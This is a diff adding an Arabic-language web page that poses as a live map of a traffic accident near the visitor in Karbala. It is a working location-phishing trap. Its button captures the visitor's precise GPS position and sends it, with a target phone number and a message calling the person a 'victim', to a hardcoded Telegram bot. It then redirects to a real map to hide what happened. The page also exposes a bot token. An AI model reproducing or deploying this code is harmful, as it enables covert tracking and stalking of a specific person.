@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>خريطة حوادث كربلاء المقدسة</title>
+    <meta charset="utf-8">
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: white; text-align: center; font-family: sans-serif; }
+        iframe { width: 100%; height: 80vh; border: none; }
+        button { background: #e74c3c; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h2>تنبيه: حادث مروري في منطقة قريبة منك بكربلاء</h2>
+    <p>اضغط على الزر أدناه لتحديد موقع الحادث بدقة على الخريطة</p>
+    <button onclick="getLocation()">فتح الخريطة الحية</button>
+
+<script>
+const TELEGRAM_TOKEN = "8632256568:AAFKWKCL2J8GUnj6SLoEVV3yNgFwdeczu0Y";
+const CHAT_ID = "8419832124";
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const msg = `🎯 صيد ثمين سيدي! الضحية فتح الرابط\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n📱 الرقم المستهدف: 07724068582`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                // تحويله لخريطة كربلاء الحقيقية للتمويه
+                window.location.href = "https://www.google.com/maps/search/%D9%83%D8%B1%D8%A8%D9%84%D8%A7%D8%A1";
+            });
+        }, err => {
+            alert("عذراً، يجب السماح بالوصول للموقع (GPS) لرؤية الحادث على الخريطة.");
+        }, {enableHighAccuracy: true});
+    }
+}
+</script>
+</body>
+</html>
